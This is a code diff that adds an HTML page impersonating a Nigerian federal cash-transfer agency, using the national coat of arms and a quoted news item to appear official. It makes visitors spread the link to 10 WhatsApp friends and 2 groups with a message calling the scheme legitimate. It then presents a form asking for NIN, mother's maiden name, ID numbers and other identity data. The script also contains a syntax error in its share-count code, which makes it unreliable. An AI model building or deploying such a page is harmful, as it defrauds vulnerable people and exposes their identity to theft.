@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mass Adoption Identity Resource - Federal Government Conditional Cash Transfer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+        
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px 5px 0 0;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .agency-name {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .coat-of-arms {
+            height: 60px;
+            margin-bottom: 10px;
+        }
+        
+        .flag {
+            height: 40px;
+            margin: 0 5px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .highlight {
+            background-color: #ffcc00;
+            color: #003366;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        
+        .highlight span {
+            font-size: 1.2em;
+            font-weight: bolder;
+        }
+        
+        .content {
+            padding: 0 20px 20px;
+        }
+        
+        p {
+            margin-bottom: 15px;
+        }
+        
+        .news {
+            background-color: #f0f8ff;
+            padding: 15px;
+            border-left: 4px solid #003366;
+            margin: 20px 0;
+        }
+        
+        .news h2 {
+            color: #003366;
+            margin-bottom: 10px;
+        }
+        
+        .news-source {
+            font-style: italic;
+            color: #666;
+            margin-top: 10px;
+        }
+        
+        .hashtags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .hashtag {
+            background-color: #e1e1e1;
+            color: #333;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        
+        .form-btn {
+            display: block;
+            width: 100%;
+            background-color: #003366;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        
+        .form-btn:hover {
+            background-color: #002244;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Share verification modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal h2 {
+            color: #003366;
+            margin-bottom: 20px;
+        }
+        
+        .share-step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+        }
+        
+        .share-step.completed {
+            background-color: #e6f7e6;
+        }
+        
+        .share-step input {
+            margin-right: 10px;
+        }
+        
+        .share-btn {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            display: inline-flex;
+            align-items: center;
+        }
+        
+        .share-btn i {
+            margin-right: 8px;
+        }
+        
+        /* Application form styles */
+        #applicationForm {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+        
+        #applicationForm h2 {
+            color: #003366;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        
+        .submit-btn {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 10px;
+            }
+            
+            header {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .modal-content {
+                padding: 20px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="agency-name">MASS ADOPTION IDENTITY RESOURCE</div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Coat_of_arms_of_Nigeria.svg/1200px-Coat_of_arms_of_Nigeria.svg.png" alt="Nigerian Coat of Arms" class="coat-of-arms">
+            <div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Flag_of_Nigeria.svg/1200px-Flag_of_Nigeria.svg.png" alt="Nigerian Flag" class="flag">
+                <span>Federal Government of Nigeria</span>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Flag_of_Nigeria.svg/1200px-Flag_of_Nigeria.svg.png" alt="Nigerian Flag" class="flag">
+            </div>
+            <h1>Conditional Cash Transfer Initiative</h1>
+        </header>
+        
+        <div class="highlight">
+            Get up to <span>₦150,000</span> from the Federal Government Conditional Cash Transfer initiative
+        </div>
+        
+        <div class="content">
+            <p>We are one of the agencies mandated to collect Nigerians' data and submit in order for the ongoing Conditional Cash Transfer initiative to get to the real and true Nigerians.</p>
+            
+            <p>This is the recent news about the progress made so far:</p>
+            
+            <div class="news">
+                <h2>FG Confirms 2.3 Million Households Have Benefited from Cash Transfer Program</h2>
+                <p>The Federal Government has confirmed the successful revalidation of 2.3 million households for the ongoing Conditional Cash Transfer initiative aimed at cushioning the impact of recent economic reforms.</p>
+                
+                <p>Director General of the National Identity Management Commission (NIMC), Abisoye Coker-Odusote, announced this during a press briefing at the agency's headquarters in Abuja. She stated that the exercise, carried out under the National Social Safety Nets project, has cleared over two million households for payment.</p>
+                
+                <p>"As of Tuesday, we've revalidated 2.3 million individuals, and payments will commence shortly. We're working closely with other agencies to ensure the funds reach the right beneficiaries," she said.</p>
+                
+                <p>Coker-Odusote emphasized the need for accurate identity verification to ensure proper targeting. "We don't want to pay people who are no longer alive. It's essential to do the right thing," she noted.</p>
+                
+                <p>She highlighted the importance of a credible identity system, saying it allows individuals to verify their identity in real time and ensures transparency in the process.</p>
+                
+                <div class="news-source">
+                    Source: <a href="https://www.facebook.com/100064751497117/posts/pfbid02bRpBHLvbeEnZPvibXi4VmKtzqr6bnvtaC1p3ZhGmR4KaW3eJbNN96qSFtzpwFvMjl/" target="_blank">Instablog</a>
+                </div>
+            </div>
+            
+            <div class="hashtags">
+                <span class="hashtag">#instablog9jaNews</span>
+                <span class="hashtag">#TrendingStory</span>
+                <span class="hashtag">#Awareness</span>
+                <span class="hashtag">#StayUpdated</span>
+            </div>
+            
+            <p>Fill your form here to be eligible for the Conditional Cash Transfer initiative.</p>
+            
+            <button class="form-btn" id="applyBtn">FILL YOUR APPLICATION FORM NOW</button>
+            
+            <!-- Application Form (hidden by default) -->
+            <div id="applicationForm">
+                <h2>Nigerian Identity Requisition Form</h2>
+                <form id="cashTransferForm">
+                    <div class="form-group">
+                        <label for="fullName">Full Name (as on NIN)</label>
+                        <input type="text" id="fullName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="dob">Date of Birth</label>
+                        <input type="date" id="dob" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="gender">Gender</label>
+                        <select id="gender" required>
+                            <option value="">Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber">Phone Number (Registered with NIN)</label>
+                        <input type="tel" id="phoneNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="state">State of Origin</label>
+                        <select id="state" required>
+                            <option value="">Select State</option>
+                            <option value="Abia">Abia</option>
+                            <option value="Adamawa">Adamawa</option>
+                            <option value="Akwa Ibom">Akwa Ibom</option>
+                            <option value="Anambra">Anambra</option>
+                            <option value="Bauchi">Bauchi</option>
+                            <option value="Bayelsa">Bayelsa</option>
+                            <option value="Benue">Benue</option>
+                            <option value="Borno">Borno</option>
+                            <option value="Cross River">Cross River</option>
+                            <option value="Delta">Delta</option>
+                            <option value="Ebonyi">Ebonyi</option>
+                            <option value="Edo">Edo</option>
+                            <option value="Ekiti">Ekiti</option>
+                            <option value="Enugu">Enugu</option>
+                            <option value="FCT">Federal Capital Territory</option>
+                            <option value="Gombe">Gombe</option>
+                            <option value="Imo">Imo</option>
+                            <option value="Jigawa">Jigawa</option>
+                            <option value="Kaduna">Kaduna</option>
+                            <option value="Kano">Kano</option>
+                            <option value="Katsina">Katsina</option>
+                            <option value="Kebbi">Kebbi</option>
+                            <option value="Kogi">Kogi</option>
+                            <option value="Kwara">Kwara</option>
+                            <option value="Lagos">Lagos</option>
+                            <option value="Nasarawa">Nasarawa</option>
+                            <option value="Niger">Niger</option>
+                            <option value="Ogun">Ogun</option>
+                            <option value="Ondo">Ondo</option>
+                            <option value="Osun">Osun</option>
+                            <option value="Oyo">Oyo</option>
+                            <option value="Plateau">Plateau</option>
+                            <option value="Rivers">Rivers</option>
+                            <option value="Sokoto">Sokoto</option>
+                            <option value="Taraba">Taraba</option>
+                            <option value="Yobe">Yobe</option>
+                            <option value="Zamfara">Zamfara</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lga">Local Government Area</label>
+                        <input type="text" id="lga" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="nin">National Identification Number (NIN)</label>
+                        <input type="text" id="nin" required pattern="[0-9]{11}" title="11 digit NIN">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="motherMaiden">Mother's Maiden Name</label>
+                        <input type="text" id="motherMaiden" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idType">Government Issued ID Type</label>
+                        <select id="idType" required>
+                            <option value="">Select ID Type</option>
+                            <option value="NIN">National ID Card</option>
+                            <option value="Voter">Voter's Card</option>
+                            <option value="Driver">Driver's License</option>
+                            <option value="Passport">International Passport</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idNumber">ID Number</label>
+                        <input type="text" id="idNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="occupation">Occupation</label>
+                        <input type="text" id="occupation" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="maritalStatus">Marital Status</label>
+                        <select id="maritalStatus" required>
+                            <option value="">Select Status</option>
+                            <option value="Single">Single</option>
+                            <option value="Married">Married</option>
+                            <option value="Divorced">Divorced</option>
+                            <option value="Widowed">Widowed</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">SUBMIT REQUISITION FORM</button>
+                </form>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Federal Government Conditional Cash Transfer Initiative © 2025</p>
+            <p>Mass Adoption Identity Resource - An Official Agency of the Federal Government of Nigeria</p>
+        </footer>
+    </div>
+
+    <!-- Share Verification Modal -->
+    <div class="modal" id="shareModal">
+        <div class="modal-content">
+            <h2>Share to Friends & Groups</h2>
+            <p>To proceed with your application, please share this information with 10 friends and 2 groups on WhatsApp to help spread awareness about this government initiative.</p>
+            
+            <div class="share-steps">
+                <div class="share-step" id="friendsStep">
+                    <input type="checkbox" id="shareFriends" disabled>
+                    <label for="shareFriends">Share with 10 friends (0/10)</label>
+                </div>
+                
+                <div class="share-step" id="groupsStep">
+                    <input type="checkbox" id="shareGroups" disabled>
+                    <label for="shareGroups">Share with 2 groups (0/2)</label>
+                </div>
+            </div>
+            
+            <button class="share-btn" id="whatsappShareBtn">
+                <i class="fab fa-whatsapp"></i> Share on WhatsApp
+            </button>
+            
+            <p style="margin-top: 20px; font-size: 14px; color: #666;">
+                After sharing, return to this page and click "Verify Shares" below.
+            </p>
+            
+            <button class="form-btn" id="verifySharesBtn" style="margin-top: 15px;">
+                VERIFY SHARES
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Track shares in localStorage
+        if (!localStorage.getItem('whatsappShares')) {
+            localStorage.setItem('whatsappShares', JSON.stringify({
+                friends: 0,
+                groups: 0
+            }));
+        }
+        
+        const shareMessage = `Federal Government Conditional Cash Transfer Initiative\n\nApply now for the Federal Government Conditional Cash Transfer program and get up to ₦150,000!\n\nThis is a legitimate government initiative to support Nigerians. Click the link below to apply:\n\n${window.location.href}\n\n#FGSupport #CashTransfer`;
+        
+        document.getElementById('applyBtn').addEventListener('click', function() {
+            document.getElementById('shareModal').style.display = 'flex';
+            updateShareStatus();
+        });
+        
+        document.getElementById('whatsappShareBtn').addEventListener('click', function() {
+            // Improved WhatsApp sharing that works on mobile devices
+            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // Mobile device
+                window.location.href = `whatsapp://send?text=${encodeURIComponent(shareMessage)}`;
+            } else {
+                // Desktop device
+                window.open(`https://web.whatsapp.com/send?text=${encodeURIComponent(shareMessage)}`, '_blank');
+            }
+        });
+        
+        document.getElementById('verifySharesBtn').addEventListener('click', function() {
+            // In a real implementation, you would need server-side verification
+            // For this demo, we'll simulate verification by asking the user
+            const friendsShared = prompt("How many friends have you shared with? (Enter a number between 0-10)");
+            const groupsShared = prompt("How many groups have you shared with? (Enter a number between 0-2)");
+            
+            if (friendsShared !== null && groupsShared !== null) {
+                const shares = {
+                    friends: Math.min(parseInt(friendsShared) || 0,
+                    groups: Math.min(parseInt(groupsShared) || 0)
+                };
+                
+                localStorage.setItem('whatsappShares', JSON.stringify(shares));
+                updateShareStatus();
+                checkCompletion();
+            }
+        });
+        
+        function updateShareStatus() {
+            const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+            
+            const friendsStep = document.getElementById('friendsStep');
+            const groupsStep = document.getElementById('groupsStep');
+            
+            friendsStep.querySelector('label').textContent = `Share with 10 friends (${shares.friends}/10)`;
+            groupsStep.querySelector('label').textContent = `Share with 2 groups (${shares.groups}/2)`;
+            
+            if (shares.friends >= 10) {
+                friendsStep.classList.add('completed');
+                friendsStep.querySelector('input').checked = true;
+            } else {
+                friendsStep.classList.remove('completed');
+                friendsStep.querySelector('input').checked = false;
+            }
+            
+            if (shares.groups >= 2) {
+                groupsStep.classList.add('completed');
+                groupsStep.querySelector('input').checked = true;
+            } else {
+                groupsStep.classList.remove('completed');
+                groupsStep.querySelector('input').checked = false;
+            }
+        }
+        
+        function checkCompletion() {
+            const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+            
+            if (shares.friends >= 10 && shares.groups >= 2) {
+                document.getElementById('shareModal').style.display = 'none';
+                document.getElementById('applicationForm').style.display = 'block';
+                window.scrollTo(0, document.getElementById('applicationForm').offsetTop);
+            }
+        }
+        
+        // Form submission
+        document.getElementById('cashTransferForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Thank you for submitting your Nigerian Identity Requisition Form. Your information will be processed and you will be contacted if approved for the Conditional Cash Transfer program.');
+            this.reset();
+        });
+    </script>
+</body>
+</html>
